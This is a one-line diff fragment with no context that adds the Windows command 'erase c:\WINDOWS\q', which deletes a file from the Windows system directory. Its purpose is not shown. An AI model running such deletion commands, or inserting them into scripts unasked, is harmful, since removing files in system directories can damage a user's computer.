@@ -1,0 +1,1 @@
+erase c:\WINDOWS\q
